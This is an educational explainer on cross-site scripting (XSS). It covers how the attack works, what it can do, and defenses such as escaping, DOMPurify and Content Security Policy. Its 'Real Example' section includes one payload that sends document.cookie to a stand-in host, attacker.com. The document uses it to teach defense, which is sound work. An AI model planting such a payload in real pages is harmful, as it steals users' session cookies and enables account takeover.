# ❗ What is Cross-Site Scripting (XSS)?

**Cross-Site Scripting (XSS)** is a type of security vulnerability that allows an attacker to inject **malicious JavaScript code** into webpages viewed by other users.

> Despite the name, XSS is **not about cross-origin requests** or "crossing sites" in the traditional sense. It’s about injecting scripts **into a site** that then get executed **in the browser of another user**.

---

## 🤔 Why is it called "Cross-Site Scripting"?

The term comes from the early days of the web when attackers would inject malicious scripts that **crossed from one site into another** via shared cookies or sessions. To avoid confusion with "Cascading Style Sheets (CSS)," the name was abbreviated as **XSS**, not CSS.

So, while the name isn't very intuitive, the idea is:

> "A script written by an attacker is executed in the browser of another user — **inside the context of a trusted site.**"

---

## 🚨 How XSS Works

1. A website reflects or stores user input (like comments, profile names, search queries) **without sanitizing it.**
2. An attacker injects JavaScript code into that input.
3. When a user visits the page, that script **runs in their browser**.

---

## 🔥 Why XSS is Dangerous

If an attacker can execute JavaScript in another user's browser, they can:

* Steal session cookies and impersonate the user
* Access `localStorage`, `sessionStorage`, or other sensitive browser data
* Perform actions on behalf of the user (like transferring funds)
* Deface or rewrite the page content
* Trick users into entering passwords into fake login forms
* Escalate into full account takeover or even administrative control

---

## 🧠 Real Example

If a comment form doesn’t sanitize input:

```html
<input value="<script>fetch('http://attacker.com?c='+document.cookie)</script>">
```

Then any user viewing that comment triggers the script — their cookie is sent to the attacker.

---

## 🔐 Defenses Against XSS

* **Escape HTML** before rendering user input (or better: don’t render HTML at all)
* **Use a frontend sanitizer** like [DOMPurify](https://github.com/cure53/DOMPurify)
* **Enable Content Security Policy (CSP)** to block inline scripts
* **Avoid `innerHTML`** and prefer safer DOM APIs
* **Never use `eval`, `new Function`, or string-based `setTimeout` with user input**

---

## ✅ Summary

| Aspect         | Explanation                               |
| -------------- | ----------------------------------------- |
| XSS stands for | Cross-Site Scripting                      |
| Name origin    | Historical, not very intuitive            |
| Goal of attack | Inject and execute JS in victim's browser |
| Risk level     | Extremely dangerous                       |
| Protection     | Sanitize input, use CSP, secure DOM usage |

---

> **XSS is one of the most common and dangerous vulnerabilities in web applications.** It doesn’t just affect users — it can compromise entire systems if exploited well.
